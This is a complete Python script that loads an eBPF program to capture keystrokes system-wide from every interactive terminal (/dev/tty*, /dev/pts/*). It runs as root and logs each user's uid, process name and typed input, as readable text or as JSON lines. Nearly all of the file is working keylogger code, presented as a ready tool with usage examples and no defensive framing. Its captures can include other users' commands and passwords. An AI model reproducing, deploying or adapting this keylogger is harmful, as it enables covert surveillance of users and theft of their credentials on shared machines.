#!/usr/bin/env python3
"""
keylog.py - Capture keystrokes from interactive TTY sessions using eBPF.

Hooks sys_read and filters for reads from TTY file descriptors (/dev/tty,
/dev/pts/*). Only captures small reads (1-64 bytes) typical of interactive
terminal input. Uses BPF perf buffers for efficient data delivery to
userspace.

Requires: root, Linux kernel >= 4.7, bcc (python3-bpfcc)
"""

import argparse
import ctypes
import json
import os
import signal
import sys
import time

try:
    from bcc import BPF
except ImportError:
    print("Error: bcc library not found. Install python3-bpfcc or bcc-tools.", file=sys.stderr)
    sys.exit(1)


BPF_PROGRAM = r"""
#include <uapi/linux/ptrace.h>
#include <linux/sched.h>
#include <linux/fs.h>
#include <linux/tty.h>
#include <linux/dcache.h>

#define MAX_DATA_LEN 256

struct keystroke_event_t {
    u64  timestamp_ns;
    u32  pid;
    u32  tgid;
    u32  uid;
    int  fd;
    u32  count;       // number of bytes actually read
    char comm[TASK_COMM_LEN];
    char data[MAX_DATA_LEN];
    u32  data_len;
};

BPF_PERF_OUTPUT(keystrokes);

// Track read() syscall arguments: tid -> (fd, buf, count)
struct read_entry_t {
    int  fd;
    u64  buf;
    u64  count;
};
BPF_HASH(active_reads, u32, struct read_entry_t);

// Capture sys_read entry arguments
TRACEPOINT_PROBE(syscalls, sys_enter_read) {
    u64 count = (u64)args__count;

    // Filter for small reads typical of interactive TTY input (1-64 bytes).
    // Large reads are almost certainly not interactive keystrokes.
    if (count == 0 || count > 64)
        return 0;

    u32 tid = bpf_get_current_pid_tgid() & 0xFFFFFFFF;
    struct read_entry_t entry = {};
    entry.fd = (int)args__fd;
    entry.buf = (u64)args__buf;
    entry.count = count;
    active_reads.update(&tid, &entry);
    return 0;
}

// On sys_read return, check if the fd is a TTY and capture the data
TRACEPOINT_PROBE(syscalls, sys_exit_read) {
    u32 tid = bpf_get_current_pid_tgid() & 0xFFFFFFFF;

    struct read_entry_t *entry = active_reads.lookup(&tid);
    if (!entry)
        return 0;

    int ret = (int)args__ret;
    if (ret <= 0) {
        active_reads.delete(&tid);
        return 0;
    }

    int fd = entry->fd;
    u64 buf = entry->buf;
    active_reads.delete(&tid);

    // Check if the file descriptor points to a TTY device.
    // We do this by inspecting the file's inode and checking if it is
    // a character device with a TTY major number.
    struct task_struct *task = (struct task_struct *)bpf_get_current_task();
    if (!task) return 0;

    struct files_struct *files;
    bpf_probe_read_kernel(&files, sizeof(files), &task->files);
    if (!files) return 0;

    struct fdtable *fdt;
    bpf_probe_read_kernel(&fdt, sizeof(fdt), &files->fdt);
    if (!fdt) return 0;

    struct file **fd_array;
    bpf_probe_read_kernel(&fd_array, sizeof(fd_array), &fdt->fd);
    if (!fd_array) return 0;

    struct file *filp;
    bpf_probe_read_kernel(&filp, sizeof(filp), &fd_array[fd]);
    if (!filp) return 0;

    // Check if this is a TTY by looking at the dentry path.
    // TTY devices are at /dev/tty*, /dev/pts/*
    struct dentry *dentry;
    bpf_probe_read_kernel(&dentry, sizeof(dentry), &filp->f_path.dentry);
    if (!dentry) return 0;

    // Check the parent directory name for "pts" or the file name for "tty"
    struct dentry *parent;
    bpf_probe_read_kernel(&parent, sizeof(parent), &dentry->d_parent);

    // Read the file name
    struct qstr d_name;
    bpf_probe_read_kernel(&d_name, sizeof(d_name), &dentry->d_name);
    char fname[8] = {};
    bpf_probe_read_kernel(fname, sizeof(fname), (void *)d_name.name);

    u8 is_tty = 0;

    // Check if filename starts with "tty"
    if (fname[0] == 't' && fname[1] == 't' && fname[2] == 'y')
        is_tty = 1;

    // Check if parent directory is "pts"
    if (!is_tty && parent) {
        struct qstr parent_name;
        bpf_probe_read_kernel(&parent_name, sizeof(parent_name), &parent->d_name);
        char pname[4] = {};
        bpf_probe_read_kernel(pname, sizeof(pname), (void *)parent_name.name);
        if (pname[0] == 'p' && pname[1] == 't' && pname[2] == 's')
            is_tty = 1;
    }

    if (!is_tty)
        return 0;

    // This is a TTY read. Capture the data.
    struct keystroke_event_t event = {};
    event.timestamp_ns = bpf_ktime_get_ns();
    event.pid = bpf_get_current_pid_tgid() >> 32;
    event.tgid = tid;
    event.uid = bpf_get_current_uid_gid() & 0xFFFFFFFF;
    event.fd = fd;
    event.count = (u32)ret;
    bpf_get_current_comm(&event.comm, sizeof(event.comm));

    // Read the actual keystroke data from user-space buffer
    u32 data_len = (u32)ret;
    if (data_len > MAX_DATA_LEN)
        data_len = MAX_DATA_LEN;
    event.data_len = data_len;
    bpf_probe_read_user(event.data, data_len, (void *)buf);

    keystrokes.perf_submit(args, &event, sizeof(event));

    return 0;
}
"""


def format_keystroke_data(data, data_len):
    """Format raw keystroke bytes into a human-readable representation."""
    raw = bytes(data[:data_len])
    readable = []
    for byte in raw:
        if byte == 0x0D or byte == 0x0A:
            readable.append("<ENTER>")
        elif byte == 0x7F or byte == 0x08:
            readable.append("<BACKSPACE>")
        elif byte == 0x09:
            readable.append("<TAB>")
        elif byte == 0x1B:
            readable.append("<ESC>")
        elif byte == 0x03:
            readable.append("<CTRL-C>")
        elif byte == 0x04:
            readable.append("<CTRL-D>")
        elif byte == 0x17:
            readable.append("<CTRL-W>")
        elif byte == 0x15:
            readable.append("<CTRL-U>")
        elif byte == 0x0C:
            readable.append("<CTRL-L>")
        elif 0x01 <= byte <= 0x1A:
            readable.append(f"<CTRL-{chr(byte + 0x40)}>")
        elif 0x20 <= byte <= 0x7E:
            readable.append(chr(byte))
        else:
            readable.append(f"\\x{byte:02x}")
    return "".join(readable)


class Keylogger:
    """Manages the eBPF-based TTY keystroke capture."""

    def __init__(self, duration=None, json_output=False):
        self.duration = duration
        self.json_output = json_output
        self.running = True
        self.bpf = None
        self.event_count = 0
        self.start_time = None

    def _log(self, message, level="info", **extra):
        if self.json_output:
            payload = {"level": level, "message": message, "timestamp": time.time()}
            payload.update(extra)
            print(json.dumps(payload), flush=True)
        else:
            print(f"[keylog] {message}", flush=True)

    def _handle_event(self, cpu, data, size):
        """Process perf buffer events containing captured keystrokes."""
        event = self.bpf["keystrokes"].event(data)
        self.event_count += 1

        comm = event.comm.decode("utf-8", errors="replace")
        data_repr = format_keystroke_data(event.data, event.data_len)
        raw_hex = bytes(event.data[: event.data_len]).hex()
        ts = time.time()

        if self.json_output:
            payload = {
                "level": "keystroke",
                "timestamp": ts,
                "timestamp_ns": event.timestamp_ns,
                "pid": event.pid,
                "uid": event.uid,
                "fd": event.fd,
                "comm": comm,
                "data": data_repr,
                "data_hex": raw_hex,
                "data_len": event.data_len,
                "count": self.event_count,
            }
            print(json.dumps(payload), flush=True)
        else:
            print(
                f"[{ts:.3f}] pid={event.pid} uid={event.uid} "
                f"comm={comm} fd={event.fd} len={event.data_len} "
                f"data={data_repr!r}",
                flush=True,
            )

    def _lost_events(self, lost_count):
        """Handle notification of lost perf buffer events."""
        self._log(f"Lost {lost_count} events (perf buffer overflow).", level="warning")

    def start(self):
        """Compile and attach the eBPF program, then poll for events."""
        self._log("Compiling eBPF program for TTY keystroke capture...")

        try:
            self.bpf = BPF(text=BPF_PROGRAM)
        except Exception as exc:
            self._log(f"Failed to compile/load eBPF program: {exc}", level="error")
            sys.exit(1)

        # Set up perf buffer with a generous page count for high-throughput capture
        self.bpf["keystrokes"].open_perf_buffer(
            self._handle_event,
            lost_cb=self._lost_events,
            page_cnt=64,
        )

        duration_msg = f" for {self.duration} seconds" if self.duration else ""
        self._log(
            f"Keystroke capture active{duration_msg}. "
            f"Monitoring TTY reads (fd: /dev/tty*, /dev/pts/*).",
            level="info",
            status="active",
            duration=self.duration,
        )
        if not self.duration:
            self._log("Press Ctrl+C to stop.")

        self.start_time = time.monotonic()

        while self.running:
            try:
                self.bpf.perf_buffer_poll(timeout=100)
            except KeyboardInterrupt:
                break

            if self.duration is not None:
                elapsed = time.monotonic() - self.start_time
                if elapsed >= self.duration:
                    self._log(
                        f"Duration of {self.duration}s reached. Stopping capture.",
                        level="info",
                    )
                    break

    def stop(self):
        """Detach probes and clean up."""
        self.running = False
        elapsed = 0.0
        if self.start_time is not None:
            elapsed = time.monotonic() - self.start_time
        if self.bpf is not None:
            self.bpf.cleanup()
        self._log(
            f"Detached eBPF probes. Captured {self.event_count} keystroke events "
            f"in {elapsed:.1f} seconds.",
            level="info",
            total_events=self.event_count,
            elapsed_seconds=round(elapsed, 1),
            status="stopped",
        )


def main():
    parser = argparse.ArgumentParser(
        description="Capture keystrokes from interactive TTY sessions using eBPF. "
        "Hooks sys_read and filters for reads from /dev/tty and /dev/pts/* devices.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  sudo python3 keylog.py\n"
            "  sudo python3 keylog.py --duration 60\n"
            "  sudo python3 keylog.py --duration 300 --json-output\n"
        ),
    )
    parser.add_argument(
        "--duration",
        type=int,
        default=None,
        help="Capture duration in seconds. If not specified, runs until Ctrl+C.",
    )
    parser.add_argument(
        "--json-output",
        action="store_true",
        default=False,
        help="Output events as JSON lines for structured consumption.",
    )
    args = parser.parse_args()

    if os.geteuid() != 0:
        print(
            "Error: This script must be run as root (eBPF requires CAP_SYS_ADMIN).",
            file=sys.stderr,
        )
        sys.exit(1)

    if args.duration is not None and args.duration <= 0:
        print("Error: Duration must be a positive integer.", file=sys.stderr)
        sys.exit(1)

    logger = Keylogger(duration=args.duration, json_output=args.json_output)

    def signal_handler(signum, frame):
        logger.stop()
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    try:
        logger.start()
    except SystemExit:
        raise
    except Exception as exc:
        logger._log(f"Unexpected error: {exc}", level="error")
        logger.stop()
        sys.exit(1)
    finally:
        logger.stop()


if __name__ == "__main__":
    main()
